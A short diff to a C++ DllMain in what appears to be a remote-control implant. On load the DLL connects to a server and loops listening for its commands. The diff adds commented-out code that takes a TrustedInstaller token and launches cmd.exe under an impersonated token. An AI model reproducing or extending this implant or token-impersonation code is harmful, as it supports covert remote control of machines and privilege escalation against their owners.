@@ -41,7 +41,24 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		if ( !me->Connect() )
 			me->~Client();
 
-		OutputDebugStringA("connected");
+		//ProcessManager mgr;
+		//mgr.GetTrustedInstallerToken();
+		//STARTUPINFO si = { 0 };
+		//PROCESS_INFORMATION pi = { 0 };
+		//std::wstring inp(L"C:\\Windows\\System32\\cmd.exe /K whoami");
+
+		//mgr.OpenProcessAsImposter(
+		//	mgr.GetToken(),
+		//	0,
+		//	NULL,
+		//	inp.data(),
+		//	CREATE_NEW_CONSOLE,
+		//	NULL,
+		//	NULL,
+		//	&si,
+		//	&pi
+		//);
+
 		me->ListenForServerCommands();
 
 		while ( 1 ) {
